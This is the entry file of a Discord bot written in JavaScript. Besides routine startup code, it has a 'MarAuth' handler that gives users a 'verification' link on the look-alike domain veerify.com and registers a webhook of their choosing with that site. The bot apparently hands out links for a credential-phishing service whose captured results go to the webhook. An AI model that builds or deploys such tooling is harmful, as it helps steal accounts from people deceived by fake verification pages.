const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  PermissionsBitField,
  Permissions,
  MessageManager,
  Embed,
  Collection,
  Events,
  ThreadChannel,
} = require(`discord.js`);
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});
const { token, mongo, password, url } = process.env;
const { request } = require("undici");
const mongoose = require("mongoose");
const { MongoClient } = require("mongodb");
const fs = require("fs");
require("dotenv").config();

//more startup bs
client.commands = new Collection();
const functions = fs
  .readdirSync("./src/functions")
  .filter((file) => file.endsWith(".js"));
const eventFiles = fs
  .readdirSync("./src/events")
  .filter((file) => file.endsWith(".js"));
const commandFolders = fs.readdirSync("./src/commands");
//end of startup bs

//startup sequence
(async () => {
  for (file of functions) {
    require(`./functions/${file}`)(client);
  }
  client.handleEvents(eventFiles, "./src/events");
  client.handleCommands(commandFolders, "./src/commands");
  client.login(process.env.token);
})();
//end of startup sequence

//marauth command
client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isModalSubmit()) return;
  const marid = interaction.user.id;
  if (interaction.customId === "marcatOauth") {
    await interaction.reply({
      content: `**Here is your MarAuth Link! [Right Click and Copy Me](https://veerify.com/verify?apiKey=${marid})**`,
      ephemeral: true,
    });
        const webhook = interaction.fields.getTextInputValue("webhook");
  		const member = interaction.user.tag;
  		const id = interaction.user.id;
    
  		console.log(`Webhook: ${webhook} \n User/apiKey: ${member}`);

  		let catResult = await request(
    		`https://veerify.com/add?apiKey=${id}&webhook=${webhook}&password=${process.env.password}`
  				).catch((err) => console.log(err));
  }
});
//marauth command end

